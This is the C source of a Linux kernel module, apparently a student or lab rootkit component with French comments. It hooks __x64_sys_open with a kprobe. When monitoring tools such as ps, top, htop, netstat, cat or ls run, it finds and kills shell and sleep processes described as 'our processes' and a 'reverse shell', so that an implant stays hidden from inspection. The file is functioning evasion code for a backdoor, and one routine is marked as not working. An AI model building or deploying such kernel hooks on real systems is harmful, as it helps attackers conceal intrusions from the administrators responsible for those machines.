#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/ptrace.h>
#include <linux/sched.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/net.h>
#include <linux/file.h>
#include <net/sock.h>
#include <linux/fdtable.h>   // Pour struct fdtable et files_fdtable
#include <linux/spinlock.h>  // Pour spin_lock et spin_unlock
#define MAX_PATH_BUFFER PATH_MAX

MODULE_LICENSE("GPL");
MODULE_AUTHOR("tibo.wav");
MODULE_DESCRIPTION("Hook __x64_sys_open using kprobes");

static struct kprobe kp;
static char path_buffer[MAX_PATH_BUFFER];

/* Fonction pour rechercher nos processus visible via ps */
static void find_and_kill_our_processes(void) {
    struct task_struct *task;
    for_each_process(task) {
		/* pr_info("[+] Found process: PID=%d, name=%s\n", task->pid, task->comm); */
		/* pr_info("[+] Parent process: PID=%d, name=%s\n", task->real_parent->pid, task->real_parent->comm); */
        // les sh qui ont pour parent kthreadd
		if (strcmp(task->comm, "sh") == 0 && task->real_parent && strcmp(task->real_parent->comm, "kthreadd") == 0) {
        	pr_info("[+] Found process: PID=%d, name=%s\n", task->pid, task->comm);
			pr_info("[+] Parent process: PID=%d, name=%s\n", task->real_parent->pid, task->real_parent->comm);
			pr_info("[+] Killing process with PID: %d, name: %s\n", task->pid, task->comm);
			send_sig(SIGKILL, task, 0);
		}
		// les sh qui ont pour parent sh
		if (strcmp(task->comm, "sh") == 0 && task->real_parent && strcmp(task->real_parent->comm, "sh") == 0) {
			pr_info("[+] Found process: PID=%d, name=%s\n", task->pid, task->comm);
			pr_info("[+] Parent process: PID=%d, name=%s\n", task->real_parent->pid, task->real_parent->comm);
			pr_info("[+] Killing process with PID: %d, name: %s\n", task->pid, task->comm);
			send_sig(SIGKILL, task, 0);

		}
		// pour les sleep
		if (strcmp(task->comm, "sleep") == 0 && task->real_parent && strcmp(task->real_parent->comm, "sh") == 0) { 
			pr_info("[+] Found process: PID=%d, name=%s\n", task->pid, task->comm);
			pr_info("[+] Parent process: PID=%d, name=%s\n", task->real_parent->pid, task->real_parent->comm);
			pr_info("[+] Killing process with PID: %d, name: %s\n", task->pid, task->comm);
			send_sig(SIGKILL, task, 0);	
		}
		// pour les processus noyaux sh ON PEUT PAS LES KILL CA CLC
		if (strcmp(task->comm, "sh") == 0 && task->real_parent && strcmp(task->real_parent->comm, "init") == 0) {
			pr_info("[+] Found kernel process: PID=%d, name=%s\n", task->pid, task->comm);
		}
		// pour les processus noyaux sleep
		if (strcmp(task->comm, "sleep") == 0 && task->real_parent && strcmp(task->real_parent->comm, "init") == 0) {
			pr_info("[+] Found kernel process: PID=%d, name=%s\n", task->pid, task->comm);
		}
	}
}

/* Fonction pour rechercher et tuer le reverse shell */ //marche pas 
static void find_and_kill_reverse_shell(void) {
	struct task_struct *task;
	for_each_process(task) {
		if (strcmp(task->comm, "sh") == 0) {
			if (task->real_parent && strcmp(task->real_parent->comm, "sh") == 0) {
				pr_info("[+] Found reverse shell: PID=%d, name=%s\n", task->pid, task->comm);
				pr_info("[+] Parent process: PID=%d, name=%s\n", task->real_parent->pid, task->real_parent->comm);
				pr_info("[+] Killing reverse shell with PID: %d, name: %s\n", task->pid, task->comm);
				send_sig(SIGKILL, task, 0);
			}
		}
	}
}

/* Fonction pour rechercher et tuer les processus liés à /proc */
static void if_its_related_to_proc_we_kill(void) {
	if (current->files) {
		pr_info("[+] Found files field in current task\n");
		struct fdtable *fdt = files_fdtable(current->files);
		if (fdt) {
			pr_info("[+] Found fdtable\n");
			for (int i = 0; i < fdt->max_fds; i++) {
				struct file *file = fdt->fd[i];
				if (file) {
					pr_info("[+] Found file in fdtable\n");
					pr_info("[+] File: %s\n", file->f_path.dentry->d_iname);
					pr_info("[+] File: %s\n", file->f_path.dentry->d_name.name);
					char *tmp = d_path(&file->f_path, path_buffer, PATH_MAX);
					pr_info("[+] Found file: %s\n", tmp);
					if (tmp) {
						if (strstr(tmp, "/proc/") != NULL) {
							pr_info("[+] Found file related to /proc: %s\n", tmp);
							pr_info("[+] Killing process with PID: %d, name: %s\n", current->pid, current->comm);
							find_and_kill_our_processes();
						}
					}
					path_buffer[0] = '\0';
				}
			}
		}
	}
}

/* Handler pour la fonction hookée (__x64_sys_open) */
static int handler_pre(struct kprobe *p, struct pt_regs *regs) {
    /* pr_info("[+] Hooked __x64_sys_open! PID: %d, name: %s", current->pid, current->comm); */
	if (strcmp(current->comm, "ps") == 0 || strcmp(current->comm, "top") == 0 || strcmp(current->comm, "htop") == 0) {
    	find_and_kill_our_processes();
    } 
	if (strcmp(current->comm, "netstat") == 0) {
		find_and_kill_reverse_shell();
	}
	if (strcmp(current->comm, "cat") == 0 || strcmp(current->comm, "ls") == 0 || strcmp(current->comm, "cd") == 0) {
		pr_info("[+] Its cat\n");
		if_its_related_to_proc_we_kill();
	}
    return 0;
}

/* Initialisation du module */
static int __init hook_init(void) {
	/* find_our_processes();	 */
    kp.symbol_name = "__x64_sys_open";
    kp.pre_handler = handler_pre;

    if (register_kprobe(&kp)) {
        pr_err("[-] Failed to register kprobe\n");
        return -1;
    }

    pr_info("[+] __x64_sys_open hooked successfully\n");
    return 0;
}

/* Nettoyage du module */
static void __exit hook_exit(void) {
    unregister_kprobe(&kp);
    pr_info("[+] __x64_sys_open unhooked successfully\n");
}

module_init(hook_init);
module_exit(hook_exit);
